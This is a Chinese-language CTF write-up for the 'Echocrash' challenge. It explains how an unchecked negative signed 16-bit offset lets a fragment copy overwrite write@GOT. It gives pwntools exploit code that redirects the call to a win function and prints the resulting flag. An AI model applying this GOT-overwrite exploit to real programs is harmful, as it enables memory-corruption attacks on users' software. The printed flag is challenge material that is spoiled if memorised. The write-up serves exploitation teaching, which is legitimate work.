# Echocrash

## 题目简述

程序把分片数据复制到全局数组 `global_buffer[0x200]`。包头中的 `buffer_offset` 是有符号 16 位整数，但代码只检查 `buffer_offset > 0x180`，没有阻止负数；`global_buffer + buffer_offset` 因此可以指向数组之前的 GOT 表。

二进制未启用 PIE，`global_buffer` 位于 `0x4040c0`，`write@GOT` 位于 `0x404028`，差值为：

$$
0x404028-0x4040c0=-0x98=-152
$$

## 解题过程

先发送一个合法的起始分片，让 `start_seen` 置位。第二个分片把偏移编码为有符号 16 位的 `-152`，将 `win` 地址写入 `write@GOT`：

```python
from pwn import ELF, p8, p16, p64, process

elf = ELF("./chall")
io = process("./chall")

start = p8(1) + p16(20) + p16(0) + b"A" * 20
io.send(start)

overwrite = (
    p8(2)
    + p16(8)
    + p16((1 << 16) - 152)
    + p64(elf.sym.win)
)
io.send(overwrite)
```

最后再发送一个正偏移大于 `0x180` 的分片，触发 `send_checksum`：

```python
trigger = p8(2) + p16(1) + p16(0x181) + b"B"
io.send(trigger)
io.interactive()
```

`send_checksum` 原本调用 `write(1, &checksum, 8)`；由于 `write@GOT` 已被改成 `win`，该调用转而执行读取 flag 的函数，输出：

```text
grey{m3mcpy_g0_brrrrrrr_ezpzXD}
```

## 方法总结

- 核心技巧：利用有符号负偏移把全局数组写入原语向前扩展到 GOT，再用后续合法调用触发被劫持的函数项。
- 识别信号：偏移字段是 `int16_t`、只检查上界、地址计算直接使用负值，且目标无 PIE/可写 GOT。
- 复用要点：必须按实际符号地址计算覆盖目标；本题 `-152` 对应 `write@GOT`，不是更靠近数组的 `memcpy@GOT`。
